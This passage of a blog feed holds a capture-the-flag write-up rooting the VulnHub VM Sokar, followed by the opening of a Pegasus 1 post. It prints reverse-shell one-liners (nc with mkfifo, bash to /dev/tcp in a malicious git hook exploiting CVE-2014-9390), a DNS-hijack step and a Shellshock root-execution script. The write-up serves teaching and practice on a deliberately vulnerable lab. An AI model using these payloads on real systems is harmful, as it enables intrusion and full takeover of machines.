&lt;p&gt;It is possible that the original source was using &lt;code&gt;gets()&lt;/code&gt; without a bounds check, but is compiled with SSP. This coupled with the fact that it is a 64bit binary and Sokar having ASLR enabled, made my head hurt. In fact, I was very demotivated at this stage as exploitation under these scenarios is very difficult.&lt;/p&gt;

&lt;p&gt;I fiddled around a little more with the binary, and inspected the call to &lt;code&gt;encryptDecrypt&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gdb-peda$ disass encryptDecrypt
Dump of assembler code for function encryptDecrypt:
   0x00000000000008ac &amp;lt;+0&amp;gt;: mov    rdx,rdi
   0x00000000000008af &amp;lt;+3&amp;gt;: mov    r9d,0x0
   0x00000000000008b5 &amp;lt;+9&amp;gt;: mov    r11,0xffffffffffffffff
   0x00000000000008bc &amp;lt;+16&amp;gt;:    mov    r10,rdi
   0x00000000000008bf &amp;lt;+19&amp;gt;:    mov    eax,0x0
   0x00000000000008c4 &amp;lt;+24&amp;gt;:    jmp    0x8d6 &amp;lt;encryptDecrypt+42&amp;gt;
   0x00000000000008c6 &amp;lt;+26&amp;gt;:    movzx  ecx,BYTE PTR [rdx+r8*1]
   0x00000000000008cb &amp;lt;+31&amp;gt;:    xor    ecx,0x49
   0x00000000000008ce &amp;lt;+34&amp;gt;:    mov    BYTE PTR [rsi+r8*1],cl
   0x00000000000008d2 &amp;lt;+38&amp;gt;:    add    r9d,0x1
   0x00000000000008d6 &amp;lt;+42&amp;gt;:    movsxd r8,r9d
   0x00000000000008d9 &amp;lt;+45&amp;gt;:    mov    rcx,r11
   0x00000000000008dc &amp;lt;+48&amp;gt;:    mov    rdi,r10
   0x00000000000008df &amp;lt;+51&amp;gt;:    repnz scas al,BYTE PTR es:[rdi]
   0x00000000000008e1 &amp;lt;+53&amp;gt;:    not    rcx
   0x00000000000008e4 &amp;lt;+56&amp;gt;:    sub    rcx,0x1
   0x00000000000008e8 &amp;lt;+60&amp;gt;:    cmp    r8,rcx
   0x00000000000008eb &amp;lt;+63&amp;gt;:    jb     0x8c6 &amp;lt;encryptDecrypt+26&amp;gt;
   0x00000000000008ed &amp;lt;+65&amp;gt;:    repz ret
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This together with pseudo code generated by Hopper helped me understand the encryptDecrypt function running a xor with &lt;strong&gt;I&lt;/strong&gt; as the key over a string.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;void encryptDecrypt(int arg0, int arg1) {
    rsi = arg1;
    rdx = arg0;
    LODWORD(r9) = 0x0;
    r10 = arg0;
    do {
            r8 = sign_extend_64(LODWORD(r9));
            asm{ repne scasb  };
            if (r8 &amp;gt;= !0xffffffffffffffff - 0x1) {
                break;
            }
            *(int8_t *)(rsi + r8) = LOBYTE(LODWORD(*(int8_t *)(rdx + r8) &amp;amp; 0xff) ^ 0x49);
            LODWORD(r9) = LODWORD(r9) + 0x1;
    } while (true);
    return;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Running the binary in &lt;code&gt;gdb&lt;/code&gt; and setting a breakpoint before the &lt;code&gt;system()&lt;/code&gt; call, we are able to inspect the 64bit registers, which cleanly reveal the encrypted &lt;strong&gt;and&lt;/strong&gt; decrypted versions of the string to be executed.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sokar # gdb -q ./build
gdb-peda$ r
Build? (Y/N) n
OK :(
[Inferior 1 (process 4450) exited with code 06]
Warning: not running or target is remote
gdb-peda$ b *0x0000555555554a38
Breakpoint 1 at 0x555555554a38
gdb-peda$ r
Build? (Y/N) Y
[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x7fffffffe740 (&amp;quot;/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&amp;quot;)
RCX: 0x7ffff7b26e99 (&amp;lt;setreuid+25&amp;gt;: cmp    rax,0xfffffffffffff000)
RDX: 0x7fffffffe7a0 (&amp;quot;f&amp;lt;:;f+ &#39;f. =i*%&amp;amp;&#39;,i::!sff;&amp;amp;&amp;amp;=\t:&amp;amp;\&amp;quot;(;d-,?sf;&amp;amp;&amp;amp;=f:,*;,=d9;&amp;amp;#,*=if$&#39;=f:,*;,=d9;&amp;amp;#,*=f&amp;quot;)
RSI: 0x0
RDI: 0x7fffffffe740 (&amp;quot;/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&amp;quot;)
RBP: 0x7fffffffe830 --&amp;gt; 0x0
RSP: 0x7fffffffe740 (&amp;quot;/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&amp;quot;)
RIP: 0x555555554a38 (&amp;lt;main+329&amp;gt;:    mov    eax,0x0)
R8 : 0x51 (&#39;Q&#39;)
R9 : 0x51 (&#39;Q&#39;)
R10: 0x0
R11: 0x246
R12: 0x7fffffffe7a0 (&amp;quot;f&amp;lt;:;f+ &#39;f. =i*%&amp;amp;&#39;,i::!sff;&amp;amp;&amp;amp;=\t:&amp;amp;\&amp;quot;(;d-,?sf;&amp;amp;&amp;amp;=f:,*;,=d9;&amp;amp;#,*=if$&#39;=f:,*;,=d9;&amp;amp;#,*=f&amp;quot;)
R13: 0x7fffffffe910 --&amp;gt; 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x555555554a2b &amp;lt;main+316&amp;gt;:   mov    eax,0x0
   0x555555554a30 &amp;lt;main+321&amp;gt;:   call   0x5555555547a0 &amp;lt;setreuid@plt&amp;gt;
   0x555555554a35 &amp;lt;main+326&amp;gt;:   mov    rdi,rbx
=&amp;gt; 0x555555554a38 &amp;lt;main+329&amp;gt;:   mov    eax,0x0
   0x555555554a3d &amp;lt;main+334&amp;gt;:   call   0x555555554750 &amp;lt;system@plt&amp;gt;
   0x555555554a42 &amp;lt;main+339&amp;gt;:   mov    rsp,r12
   0x555555554a45 &amp;lt;main+342&amp;gt;:   jmp    0x555555554a5d &amp;lt;main+366&amp;gt;
   0x555555554a47 &amp;lt;main+344&amp;gt;:   lea    rsi,[rip+0x12c]        # 0x555555554b7a
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe740 (&amp;quot;/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&amp;quot;)
0008| 0x7fffffffe748 (&amp;quot;/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&amp;quot;)
0016| 0x7fffffffe750 (&amp;quot;ne ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&amp;quot;)
0024| 0x7fffffffe758 (&amp;quot;/root@sokar-dev:/root/secret-project /mnt/secret-project/&amp;quot;)
0032| 0x7fffffffe760 (&amp;quot;kar-dev:/root/secret-project /mnt/secret-project/&amp;quot;)
0040| 0x7fffffffe768 (&amp;quot;/root/secret-project /mnt/secret-project/&amp;quot;)
0048| 0x7fffffffe770 (&amp;quot;cret-project /mnt/secret-project/&amp;quot;)
0056| 0x7fffffffe778 (&amp;quot;ject /mnt/secret-project/&amp;quot;)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0000555555554a38 in main ()
gdb-peda$ x/x $rbx
0x7fffffffe740: 0x2f
gdb-peda$ x/s $rbx
0x7fffffffe740:  &amp;quot;/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&amp;quot;
gdb-peda$ x/s $rdx
0x7fffffffe7a0:  &amp;quot;f&amp;lt;:;f+ &#39;f. =i*%&amp;amp;&#39;,i::!sff;&amp;amp;&amp;amp;=\t:&amp;amp;\&amp;quot;(;d-,?sf;&amp;amp;&amp;amp;=f:,*;,=d9;&amp;amp;#,*=if$&#39;=f:,*;,=d9;&amp;amp;#,*=f&amp;quot;
gdb-peda$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Right before this call though, there is a instruction to &lt;code&gt;call   0x5555555547a0 &amp;lt;setreuid@plt&amp;gt;&lt;/code&gt; to set the UID to 0. So, this brought me to the conclusion that &lt;code&gt;build&lt;/code&gt; is running &lt;code&gt;/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&lt;/code&gt; as &lt;code&gt;root&lt;/code&gt;. But what is so special about this?&lt;/p&gt;

&lt;h3 id=&#34;inspecting-git&#34;&gt;inspecting git&lt;/h3&gt;

&lt;p&gt;I did a lot of poking around here, wondering if I should pursue the avenue of trying to exploit the b0f which has the SSP, or should I try and figure out the significance of a &lt;code&gt;git clone&lt;/code&gt; as root? One of my first theories was that if I could get &lt;code&gt;sokar-dev&lt;/code&gt; to resolve to something I am in control of (like my Kali vm), I could attempt to have git clone a setuid shell. This was, of course, before I remembered that the only permissions &lt;code&gt;git&lt;/code&gt; will honor really is the symlink and executable bits :(&lt;/p&gt;

&lt;p&gt;Further enumeration while I was thinking about the possibilities revealed that &lt;code&gt;/mnt/&lt;/code&gt; was actually mounted with the &lt;code&gt;vfat&lt;/code&gt; filesystem!&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python apophis.py &amp;quot;mount; cat /etc/fstab&amp;quot;
 * Executing /usr/bin/python -c &amp;quot;import time; time.sleep(2); print &#39;overdrive&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;, &#39;-l&#39;, &#39;-c&#39;,&#39;mount; cat /etc/fstab&#39;, &#39;apophis&#39;]);&amp;quot;

Password:
/dev/sda1 on / type ext4 (rw)
proc on /proc type proc (rw)
sysfs on /sys type sysfs (rw)
devpts on /dev/pts type devpts (rw,gid=5,mode=620)
tmpfs on /dev/shm type tmpfs (rw)
/dev/sdb1 on /mnt type vfat (rw,uid=501,gid=502)
none on /proc/sys/fs/binfmt_misc type binfmt_misc (rw)

#
# /etc/fstab
# Created by anaconda on Wed Nov 12 13:29:15 2014
#
# Accessible filesystems, by reference, are maintained under &#39;/dev/disk&#39;
# See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info
#
UUID=cdb3ac23-d831-4104-bc76-e3a56314b6e4 /                       ext4    defaults        1 1
tmpfs                   /dev/shm                tmpfs   defaults        0 0
devpts                  /dev/pts                devpts  gid=5,mode=620  0 0
sysfs                   /sys                    sysfs   defaults        0 0
proc                    /proc                   proc    defaults        0 0
/dev/sdb1       /mnt            vfat    defaults,uid=501,gid=502    0 0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As you can see, &lt;code&gt;/mnt&lt;/code&gt; also specified the uid/gid for files on the mount, so even if I &lt;em&gt;were&lt;/em&gt; able to get a suid shell onto the file system, root will not be the one owning it.&lt;/p&gt;

&lt;p&gt;However. &lt;code&gt;vfat&lt;/code&gt;. Why &lt;code&gt;vfat&lt;/code&gt;&amp;hellip; Of course! &lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9390&#34;&gt;CVE-2014-9390&lt;/a&gt;. The potential client side code execution bug in older &lt;code&gt;git&lt;/code&gt; versions where a case insensitive filesystem may cause the &lt;code&gt;git&lt;/code&gt; client to read hooks from &lt;code&gt;.Git/hooks&lt;/code&gt; instead of &lt;code&gt;.git/hooks&lt;/code&gt;. And, of course, &lt;code&gt;vfat&lt;/code&gt; is a case insensitive filesystem, which makes for the perfect scenario to exploit this bug.&lt;/p&gt;

&lt;p&gt;I checked up on the installed version of &lt;code&gt;git&lt;/code&gt; on Sokar, just to make sure that it is in fact vulnerable:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python apophis.py &amp;quot;git --version&amp;quot;
 * Executing /usr/bin/python -c &amp;quot;import time; time.sleep(2); print &#39;overdrive&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;, &#39;-l&#39;, &#39;-c&#39;,&#39;git --version&#39;, &#39;apophis&#39;]);&amp;quot;

Password:
git version 2.2.0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Great. &lt;code&gt;git&lt;/code&gt; version 2.2.1 fixed this bug so we are in luck.&lt;/p&gt;

&lt;h2 id=&#34;rooting-sokar&#34;&gt;rooting sokar&lt;/h2&gt;

&lt;p&gt;All of this information was great to have, but it still had one major problem. How can I clone a repository &lt;strong&gt;I&lt;/strong&gt; own? I made &lt;em&gt;countless&lt;/em&gt; attempts to try fool the environment into resolving &lt;code&gt;sokar-dev&lt;/code&gt; to my Kali Host. Every single one failed. All of the material on the topic that I found online suggest that the SUID process &amp;lsquo;cleans up&amp;rsquo; the environment, especially for reasons such as this one.&lt;/p&gt;

&lt;p&gt;I started doubting my plan and was nearing a point of leaving Sokar for a bit to rethink my strategy when I realized the following gem:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python apophis.py &amp;quot;find /etc/ -writable -type f 2&amp;gt;/dev/null | xargs ls -lh&amp;quot;
 * Executing /usr/bin/python -c &amp;quot;import time; time.sleep(2); print &#39;overdrive&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;, &#39;-l&#39;, &#39;-c&#39;,&#39;find /etc/ -writable -type f 2&amp;gt;/dev/null | xargs ls -lh&#39;, &#39;apophis&#39;]);&amp;quot;

Password:
-rw-rw-rw- 1 root root 19 Jan  2 20:12 /etc/resolv.conf
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;/etc/resolv.conf&lt;/code&gt; is &lt;strong&gt;world writable&lt;/strong&gt;. This is perfect! I can change the DNS server to use to one that I control, obviously feeding it a IP that will be my local Kali instance :D&lt;/p&gt;

&lt;h3 id=&#34;preparing-the-environment-and-exploit&#34;&gt;preparing the environment and exploit&lt;/h3&gt;

&lt;p&gt;I decided to use &lt;code&gt;dnsmasq&lt;/code&gt; for a quick to setup DNS server. I added a line to &lt;code&gt;/etc/dnsmasq.hosts&lt;/code&gt; to answer a query for &lt;code&gt;sokar-dev&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ cat /etc/dnsmasq.hosts
192.168.217.174 sokar-dev
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&amp;hellip; and started the &lt;code&gt;dnsmasq&lt;/code&gt; server:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ dnsmasq --no-daemon --log-queries -H /etc/dnsmasq.hosts

dnsmasq: started, version 2.62 cachesize 150
dnsmasq: compile time options: IPv6 GNU-getopt DBus i18n IDN DHCP DHCPv6 no-Lua TFTP conntrack
dnsmasq: reading /etc/resolv.conf
dnsmasq: using nameserver 192.168.252.2#53
dnsmasq: read /etc/hosts - 6 addresses
dnsmasq: read /etc/dnsmasq.hosts - 1 addresses
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Testing my DNS server proved that it was working just fine:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ dig sokar-dev @127.0.0.1

; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.8.4-rpz2+rl005.12-P1 &amp;lt;&amp;lt;&amp;gt;&amp;gt; sokar-dev @127.0.0.1
;; global options: +cmd
;; Got answer:
;; -&amp;gt;&amp;gt;HEADER&amp;lt;&amp;lt;- opcode: QUERY, status: NOERROR, id: 48044
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;sokar-dev.         IN  A

;; ANSWER SECTION:
sokar-dev.      0   IN  A   192.168.217.174

;; Query time: 13 msec
;; SERVER: 127.0.0.1#53(127.0.0.1)
;; WHEN: Tue Feb  3 12:12:02 2015
;; MSG SIZE  rcvd: 43
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Awesome. The next step was to replace the contents of Sokar&amp;rsquo;s &lt;code&gt;/etc/resolv.conf&lt;/code&gt; so that the dns server to use is &lt;em&gt;192.168.217.174&lt;/em&gt; with the command &lt;code&gt;python apophis.py &amp;quot;echo \&amp;quot;nameserver\ 192.168.217.174\&amp;quot; &amp;gt; /etc/resolv.conf&amp;quot;&lt;/code&gt; and confirm that it worked:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python apophis.py &amp;quot;cat /etc/resolv.conf&amp;quot;
 * Executing /usr/bin/python -c &amp;quot;import time; time.sleep(2); print &#39;overdrive&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;, &#39;-l&#39;, &#39;-c&#39;,&#39;cat /etc/resolv.conf&#39;, &#39;apophis&#39;]);&amp;quot;

Password:
nameserver 192.168.217.174
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Great. Testing time!&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python apophis.py &amp;quot;echo Y | /home/apophis/build&amp;quot;
 * Executing /usr/bin/python -c &amp;quot;import time; time.sleep(2); print &#39;overdrive&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;, &#39;-l&#39;, &#39;-c&#39;,&#39;echo Y | /home/apophis/build&#39;, &#39;apophis&#39;]);&amp;quot;

Password:
Cloning into &#39;/mnt/secret-project&#39;...
Host key verification failed.
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.
Build? (Y/N)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Yesssssss, and nooooooooo. From the &lt;code&gt;dnsmasq&lt;/code&gt; console output I could see the request for &lt;code&gt;sokar-dev&lt;/code&gt; coming in and a reply getting sent:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;dnsmasq: query[A] sokar-dev from 192.168.217.163
dnsmasq: /etc/dnsmasq.hosts sokar-dev is 192.168.217.174
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;However, in order for the SSH session to happen, I need to either accept or bypass the host key verification. There are many ways to do this, but sadly, with my current (still! :D) nonexistent interactive shell, I can not type &amp;lsquo;yes&amp;rsquo;. I can not use &lt;code&gt;ssh-keyscan &amp;gt;&amp;gt; ~/.ssh/known_hosts&lt;/code&gt; as I can&amp;rsquo;t write to &lt;code&gt;root&lt;/code&gt;&amp;rsquo;s &lt;code&gt;.ssh&lt;/code&gt; directory, nor can I modify the command that is being passed onto &lt;code&gt;system()&lt;/code&gt; in the binary to specify &lt;code&gt;-o StrictHostKeyChecking=no&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Unfortunately, due to these restrictions, I had to finally give in and go one step back to &lt;code&gt;bynarr.py&lt;/code&gt; and use his allowed egress access on &lt;code&gt;tcp/51242&lt;/code&gt; to build a interactive shell. On one session I started a netcat listener, and on another, I ran &lt;code&gt;python bynarr.py &amp;quot;/bin/rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 192.168.217.174 51242 &amp;gt;/tmp/f&amp;quot;&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ nc -lvp 51242
listening on [any] 51242 ...
192.168.217.163: inverse host lookup failed: Unknown server error : Connection timed out
connect to [192.168.217.174] from (UNKNOWN) [192.168.217.163] 40382
sh: no job control in this shell
sh-4.1$ python -c &#39;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;
python -c &#39;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;
[bynarr@sokar cgi-bin]$ su - apophis
su - apophis
Password: overdrive

[apophis@sokar ~]$ id
id
uid=501(apophis) gid=502(apophis) groups=502(apophis)
[apophis@sokar ~]$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With the interactive shell as &lt;code&gt;apophis&lt;/code&gt; now, I was able to accept the SSH hostkey check.&lt;/p&gt;

&lt;p&gt;The next thing left on the list was to prepare a &lt;code&gt;git&lt;/code&gt; repository that can actually be cloned. Setting one up is reaaaaally simple. Because I knew that it will be looking for &lt;code&gt;/root/secret-project&lt;/code&gt;, I prepared just that on my Kali VM:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ cd /root
leonjza@kali/root $ mkdir secret-project
leonjza@kali/root $ cd secret-project
leonjza@kali/root/secret-project $ git init --bare
Initialized empty Git repository in /root/secret-project/
leonjza@kali/root/secret-project | git:master $
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Thats it&amp;hellip; Next, I cloned it locally in a different folder.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ git clone ssh://127.0.0.1/root/secret-project
Cloning into &#39;secret-project&#39;...
root@127.0.0.1&#39;s password:
warning: You appear to have cloned an empty repository.
leonjza@kali/sokar $ cd secret-project
leonjza@kali/sokar/secret-project | git:master $
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Done. Working from a PoC exploit found &lt;a href=&#34;https://gitlab.com/mehmet/cve-2014-9390&#34;&gt;here&lt;/a&gt;, I continued to prepare a similar exploit, except for the fact that I changed the actual hook to connect to my Mac (hosting the VM&amp;rsquo;s) on a &lt;code&gt;tcp/22&lt;/code&gt; netcat listener, spawning a shell. I knew &lt;code&gt;tcp/22&lt;/code&gt; traffic was allowed due to the SSH host key verification step that needed some work :)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar/secret-project | git:master $ mkdir .Git
leonjza@kali/sokar/secret-project | git:master $ cd .Git
leonjza@kali/sokar/secret-project/.Git | git:master $ mkdir hooks
leonjza@kali/sokar/secret-project/.Git | git:master $ cd hooks
leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ vim post-checkout
leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ cat post-checkout
#!/bin/sh
bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.217.1/22 0&amp;gt;&amp;amp;1
leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ chmod +x ./post-checkout
leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ git add -A
leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ git commit -m &#39;pwnd&#39;
[master (root-commit) ee364fd] pwnd
 Committer: root &amp;lt;root@localhost.localdomain&amp;gt;

 1 file changed, 2 insertions(+)
 create mode 100755 .Git/hooks/post-checkout
leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ git push -u origin master
root@127.0.0.1&#39;s password:
Counting objects: 5, done.
Compressing objects: 100% (2/2), done.
Writing objects: 100% (5/5), 345 bytes, done.
Total 5 (delta 0), reused 0 (delta 0)
To ssh://127.0.0.1/root/secret-project
 * [new branch]      master -&amp;gt; master
Branch master set up to track remote branch master from origin.
leonjza@kali/sokar/secret-project/.Git/hooks | git:master $
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With my evil repository ready, it was time to try that &lt;code&gt;build&lt;/code&gt; again :)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[apophis@sokar ~]$ ./build
./build
Build? (Y/N) Y
Y
Cloning into &#39;/mnt/secret-project&#39;...
root@sokar-dev&#39;s password: # redact lol

remote: Counting objects: 5, done.
remote: Compressing objects: 100% (2/2), done.
Receiving objects: 100% (5/5), done.
remote: Total 5 (delta 0), reused 0 (delta 0)
Checking connectivity... done.

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This shell just &amp;lsquo;hung&amp;rsquo; there, however, the netcat listener on my Mac had a different story to tell:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;leonjza@laptop » sudo nc -lv 22
Password:
[root@sokar secret-project]# cat /root/flag
cat /root/flag
                0   0
                |   |
            ____|___|____
         0  |~ ~ ~ ~ ~ ~|   0
         |  |   Happy   |   |
      ___|__|___________|___|__
      |/\/\/\/\/\/\/\/\/\/\/\/|
  0   |    B i r t h d a y    |   0
  |   |/\/\/\/\/\/\/\/\/\/\/\/|   |
 _|___|_______________________|___|__
|/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/|
|                                   |
|     V  u  l  n  H  u  b   ! !     |
| ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ |
|___________________________________|

=====================================
| Congratulations on beating Sokar! |
|                                   |
|  Massive shoutout to g0tmi1k and  |
| the entire community which makes  |
|         VulnHub possible!         |
|                                   |
|    rasta_mouse (@_RastaMouse)     |
=====================================
[root@sokar secret-project]#
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;conclusion&#34;&gt;conclusion&lt;/h2&gt;

&lt;p&gt;What a blast! Them feels of r00t are so &lt;em&gt;gooood&lt;/em&gt;. For the curios, that firewall that was making life so difficult:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[root@sokar secret-project]# cat /etc/sysconfig/iptables
cat /etc/sysconfig/iptables
# Firewall configuration written by system-config-firewall
# Manual customization of this file is not recommended.
*filter
:INPUT ACCEPT [0:0]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
-A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
-A INPUT -p icmp -j DROP
-A INPUT -i lo -j ACCEPT
-A INPUT -m state --state ESTABLISHED -p tcp --sport 22 -j ACCEPT
-A INPUT -m state --state NEW,ESTABLISHED -p tcp --dport 591 -j ACCEPT
-A INPUT -p udp --sport 53 -j ACCEPT
-A OUTPUT -m state --state NEW,ESTABLISHED -m owner --uid-owner 0 -p tcp --dport 22 -j ACCEPT
-A OUTPUT -p udp --dport 53 -m owner --uid-owner 0 -j ACCEPT
-A OUTPUT -m state --state ESTABLISHED -p tcp --sport 591 -j ACCEPT
-A OUTPUT -m state --state NEW,ESTABLISHED -m owner --gid-owner 501 -p tcp --dport 51242 -j ACCEPT
-A OUTPUT -j DROP
COMMIT
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;edit&#34;&gt;edit&lt;/h2&gt;

&lt;p&gt;I have been wondering if it was possible to get complete remote root command execution using the sample python scripts used for apophis and bynarr. Well, turns out the &lt;code&gt;lime&lt;/code&gt; script run with &lt;code&gt;sudo&lt;/code&gt; can be shocked too!&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/python

# 2015 Leon Jacobs
# sokar remote root command execution

import requests
import sys

if len(sys.argv) &amp;lt; 2:

    print &amp;quot; * Usage %s &amp;lt;cmd&amp;gt;&amp;quot; % sys.argv[0]
    sys.exit(1)

# Grab the command from the args
command = sys.argv[1].strip()

# prep to shock the lime script
root_command = &amp;quot;&amp;quot;&amp;quot;echo &amp;quot;N&amp;quot; | sudo MAIL=\\&amp;quot;() { :;}; %s;\\&amp;quot; /home/bynarr/lime&amp;quot;&amp;quot;&amp;quot; % command

# prep to exec the command as bynarr
payload = &amp;quot;&amp;quot;&amp;quot;/usr/bin/python -c &amp;quot;import time; time.sleep(1); print &#39;fruity&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;%s&#39;, &#39;bynarr&#39;]);&amp;quot; &amp;quot;&amp;quot;&amp;quot; % root_command

# be verbose about the full command
print &amp;quot; * Executing %s\n&amp;quot; % payload

# Send the sploit
headers = { &amp;quot;User-Agent&amp;quot;: &amp;quot;() { :;};echo;%s&amp;quot; % payload }
print requests.get(&amp;quot;http://192.168.217.163:591/cgi-bin/cat&amp;quot;, headers=headers).text.strip()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Run with &lt;code&gt;python root.py &amp;quot;/bin/cat /root/flag&amp;quot;&lt;/code&gt; :D&lt;/p&gt;

&lt;p&gt;Thanks to &lt;a href=&#34;https://twitter.com/_RastaMouse&#34;&gt;@_RastaMouse&lt;/a&gt; for the VM, and as always, &lt;a href=&#34;https://twitter.com/VulnHub&#34;&gt;@VulnHub&lt;/a&gt; for the hosting and great community!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>hoof to root solving pegasus 1</title>
      <link>https://leonjza.github.io/blog/2014/12/23/hoof-to-root-solving-pegasus-1/</link>
      <pubDate>Tue, 23 Dec 2014 08:29:49 +0000</pubDate>
      
      <guid>https://leonjza.github.io/blog/2014/12/23/hoof-to-root-solving-pegasus-1/</guid>
      <description>

&lt;h2 id=&#34;introduction&#34;&gt;introduction&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://www.vulnhub.com/entry/pegasus-1,109/&#34;&gt;Pegasus 1&lt;/a&gt; is a boot2root hosted on &lt;a href=&#34;https://www.vulnhub.com/&#34;&gt;VulnHub&lt;/a&gt; built by &lt;a href=&#34;https://twitter.com/theknapsy&#34;&gt;@TheKnapsy&lt;/a&gt;. He wrote a &lt;a href=&#34;http://knapsy.github.io/blog/2014/12/16/pegasus-has-arrived-my-first-boot2root-vm/&#34;&gt;blogpost&lt;/a&gt; about it too containing a small introduction with Pegasus as his first boot2root (hoof2root? ;p).&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/pegasus_logo.png&#34; /&gt;
    
    
&lt;/figure&gt;


